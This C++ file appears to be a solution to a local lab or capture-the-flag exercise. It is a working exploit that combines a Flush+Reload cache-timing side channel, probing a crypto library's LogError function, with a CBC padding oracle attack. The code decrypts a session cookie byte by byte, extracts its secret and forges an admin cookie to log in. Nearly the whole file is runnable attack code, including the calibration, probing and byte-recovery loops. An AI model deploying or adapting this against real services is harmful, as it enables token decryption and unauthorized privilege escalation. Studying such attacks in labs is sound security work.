#include <iostream>
#include <iomanip>
#include <unistd.h>
#include <cstring>
#include <algorithm>
#include <numeric>
#include <cstdint>
#include <climits>
#include <vector>

#include "./simple_networking.h"
#include "./tinycrypt/tinycrypt.h"
#include "./base64.h"
#include "./config.h"

// ==========================================================================
// # Helper Functions
// ==========================================================================
using ByteVector = std::vector<std::byte>;

std::string StrFromByteVector(const ByteVector& vec) {
  std::string res;
  for (size_t i = 0; i < vec.size(); i++) {
    res += static_cast<char>(std::to_integer<int>(vec[i]));
  }
  return res;
}

ByteVector ByteVectorFromStr(const std::string& str) {
  ByteVector res;
  for (size_t i = 0; i < str.size(); i++) {
    res.push_back(std::byte{static_cast<unsigned char>(str[i])});
  }
  return res;
}

void PrintLeakedCookieSecret(std::string leaked_cookie_secret) {
  std::cout << "[+] Leaked Cookie Secret: '" << leaked_cookie_secret
      << "'" << std::endl;
}

void PrintResponse(simple_networking::TCPClient* client) {
  std::cout << client->ReadMessage().ToString() << std::endl;
}

void RunInteractive(simple_networking::TCPClient* client) {
  std::cout << "Running interactive mode..." << std::endl;
  std::cout << "Type 'q' to exit and 'help' for help." << std::endl;

  while(true) {
    std::string msg;
    std::cout << "> ";
    std::getline(std::cin, msg);
    if (msg == "q") break;
    if (msg.size() == 0) continue;
    client->SendMessage(msg);

    simple_networking::ByteArray response_raw = client->ReadMessage();
    std::string response = response_raw.ToString();
    std::cout << response << std::endl;
  }
}

// ==========================================================================
// # Flush+Reload Side Channel
// ==========================================================================

static void* g_log_error_addr = nullptr;
static uint64_t g_threshold = 0;

static inline void flush(void* addr) {
  asm volatile("clflush (%0)" :: "r"(addr) : "memory");
  asm volatile("mfence" ::: "memory");
}

static inline uint64_t probe(void* addr) {
  uint32_t start_lo, start_hi, end_lo, end_hi;

  asm volatile(
    "mfence\n\t"
    "rdtsc\n\t"
    : "=a"(start_lo), "=d"(start_hi)
  );

  volatile char tmp = *(volatile char*)addr;
  (void)tmp;

  asm volatile(
    "mfence\n\t"
    "rdtsc\n\t"
    : "=a"(end_lo), "=d"(end_hi)
  );

  uint64_t start = ((uint64_t)start_hi << 32) | start_lo;
  uint64_t end = ((uint64_t)end_hi << 32) | end_lo;
  return end - start;
}

void init_side_channel() {
  g_log_error_addr = reinterpret_cast<void*>(
      reinterpret_cast<uintptr_t>(&tinycrypt::LogError));
  std::cout << "[+] LogError at: " << g_log_error_addr << std::endl;
}

void calibrate() {
  std::vector<uint64_t> hit_times, miss_times;

  // Warm up
  for (int i = 0; i < 10; i++) {
    volatile char tmp = *(volatile char*)g_log_error_addr;
    (void)tmp;
  }

  // Measure hits
  for (int i = 0; i < 1000; i++) {
    volatile char tmp = *(volatile char*)g_log_error_addr;
    (void)tmp;
    hit_times.push_back(probe(g_log_error_addr));
  }

  // Measure misses
  for (int i = 0; i < 1000; i++) {
    flush(g_log_error_addr);
    asm volatile("mfence" ::: "memory");
    miss_times.push_back(probe(g_log_error_addr));
  }

  std::sort(hit_times.begin(), hit_times.end());
  std::sort(miss_times.begin(), miss_times.end());

  uint64_t hit_median = hit_times[hit_times.size() / 2];
  uint64_t miss_median = miss_times[miss_times.size() / 2];
  g_threshold = (hit_median + miss_median) / 2;

  std::cout << "[+] Calibration: hit=" << hit_median
            << ", miss=" << miss_median
            << ", threshold=" << g_threshold << std::endl;
}

// Single Flush+Reload measurement
// Returns probe time
uint64_t flush_reload_once(simple_networking::TCPClient* client, const std::string& cookie) {
  flush(g_log_error_addr);
  asm volatile("mfence" ::: "memory");

  client->SendMessage("login " + cookie);
  client->ReadMessage();

  return probe(g_log_error_addr);
}

// Measure with many samples, return median probe time
uint64_t measure_median_probe(simple_networking::TCPClient* client, const std::string& cookie, int samples) {
  std::vector<uint64_t> times;

  for (int i = 0; i < samples; i++) {
    times.push_back(flush_reload_once(client, cookie));
  }

  std::sort(times.begin(), times.end());
  return times[times.size() / 2];
}

// Count cache hits (probe time < threshold)
int count_hits(simple_networking::TCPClient* client, const std::string& cookie, int samples) {
  int hits = 0;

  for (int i = 0; i < samples; i++) {
    uint64_t t = flush_reload_once(client, cookie);
    if (t < g_threshold) hits++;
  }

  return hits;
}

// ==========================================================================
// # Padding Oracle Attack
// ==========================================================================

void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
  std::cout << "Running stored commands..." << std::endl;

  init_side_channel();
  calibrate();

  // Get cookie
  client->SendMessage("get-cookie");
  std::string cookie = client->ReadMessage().ToString();
  std::cout << "[+] Got cookie: " << cookie << std::endl;

  // Parse cookie
  size_t dot_pos = cookie.find('.');
  if (dot_pos == std::string::npos) {
    std::cerr << "[-] Invalid cookie format" << std::endl;
    return;
  }

  std::string ct_b64 = cookie.substr(0, dot_pos);
  std::string hmac_b64 = cookie.substr(dot_pos + 1);
  ByteVector iv_ct = base64::base64_decode(ct_b64);

  std::cout << "[+] Ciphertext: " << iv_ct.size() << " bytes" << std::endl;

  // First, test the side channel with known valid/invalid
  std::cout << "[+] Testing side channel..." << std::endl;

  // Valid cookie - should NOT call LogError
  int valid_hits = count_hits(client, cookie, 20);
  std::cout << "    Valid cookie: " << valid_hits << "/20 hits" << std::endl;

  // Corrupted cookie - should call LogError
  ByteVector corrupted = iv_ct;
  corrupted[20] = static_cast<std::byte>(static_cast<uint8_t>(corrupted[20]) ^ 0xFF);
  std::string corrupted_cookie = base64::base64_encode(corrupted) + "." + hmac_b64;
  int invalid_hits = count_hits(client, corrupted_cookie, 20);
  std::cout << "    Corrupted cookie: " << invalid_hits << "/20 hits" << std::endl;

  bool use_cache_hits = (invalid_hits > valid_hits + 3);
  std::cout << "[+] Side channel " << (use_cache_hits ? "WORKING" : "NOT WORKING")
            << " - using " << (use_cache_hits ? "cache hits" : "median timing") << std::endl;

  // Plaintext: "nobody-XXXXXXXX" + 0x01 padding = 16 bytes
  std::vector<uint8_t> intermediate(16, 0);
  std::vector<uint8_t> recovered(16, 0);

  const int SAMPLES = use_cache_hits ? 10 : 3;

  // Padding oracle attack
  for (int pos = 15; pos >= 0; pos--) {
    uint8_t target_pad = 16 - pos;

    std::cout << "[*] Byte " << pos << " (pad=0x" << std::hex << (int)target_pad << std::dec << "): " << std::flush;

    ByteVector modified = iv_ct;

    // Set already-known bytes for target padding
    for (int j = pos + 1; j < 16; j++) {
      modified[j] = static_cast<std::byte>(intermediate[j] ^ target_pad);
    }

    int best_guess = 0;

    if (use_cache_hits) {
      // Find guess with MOST cache hits (LogError NOT called = valid padding)
      // Wait, that's backwards. LogError called = cache hit. So valid padding = FEWER hits.
      int min_hits = INT_MAX;

      for (int guess = 0; guess < 256; guess++) {
        modified[pos] = static_cast<std::byte>(guess);
        std::string test_cookie = base64::base64_encode(modified) + "." + hmac_b64;

        int hits = count_hits(client, test_cookie, SAMPLES);

        if (hits < min_hits) {
          min_hits = hits;
          best_guess = guess;
        }
      }
    } else {
      // Fall back to median timing - valid padding might be slightly faster
      uint64_t min_time = UINT64_MAX;

      for (int guess = 0; guess < 256; guess++) {
        modified[pos] = static_cast<std::byte>(guess);
        std::string test_cookie = base64::base64_encode(modified) + "." + hmac_b64;

        uint64_t med = measure_median_probe(client, test_cookie, SAMPLES);

        if (med < min_time) {
          min_time = med;
          best_guess = guess;
        }
      }
    }

    intermediate[pos] = best_guess ^ target_pad;
    uint8_t orig_iv = static_cast<uint8_t>(iv_ct[pos]);
    recovered[pos] = intermediate[pos] ^ orig_iv;

    char c = (char)recovered[pos];
    std::cout << "0x" << std::hex << std::setw(2) << std::setfill('0')
              << (int)recovered[pos] << std::dec
              << " ('" << (isprint(c) ? c : '?') << "')" << std::endl;
  }

  // Extract results
  std::string plaintext(recovered.begin(), recovered.end());
  std::cout << "[+] Recovered: ";
  for (int i = 0; i < 16; i++) {
    if (isprint(recovered[i])) std::cout << (char)recovered[i];
    else std::cout << "\\x" << std::hex << std::setw(2) << std::setfill('0') << (int)recovered[i];
  }
  std::cout << std::dec << std::endl;

  std::string leaked_cookie_secret = plaintext.substr(7, 8);
  PrintLeakedCookieSecret(leaked_cookie_secret);

  // Forge admin cookie
  std::string admin_plain = "admin-" + leaked_cookie_secret;
  std::string admin_b64 = base64::base64_encode(ByteVectorFromStr(admin_plain));

  std::cout << "[+] Forging admin cookie..." << std::endl;
  client->SendMessage("encrypt " + admin_b64);
  std::string admin_cookie = client->ReadMessage().ToString();

  // Login
  client->SendMessage("login " + admin_cookie);
  PrintResponse(client);
}

int main([[maybe_unused]] int argc, [[maybe_unused]] char* argv[]) {
  bool interactive = argc == 2 && std::string(argv[1]) == "-i";

  simple_networking::TCPClient tcp_client(VERBOSE_NETWORK);
  try {
    int err = tcp_client.Connect("127.0.0.1", SERVER_PORT);
    if (err != 0) {
      std::cerr << "[-] Could not connect to server" << std::endl;
      return 1;
    }
    if (interactive) {
      RunInteractive(&tcp_client);
    } else {
      RunStoredCommands(&tcp_client);
    }
  } catch (std::runtime_error& e) {
    std::cerr << "[-] Connection error: " << e.what() << std::endl;
    return 1;
  }

  tcp_client.Disconnect();
  return 0;
}
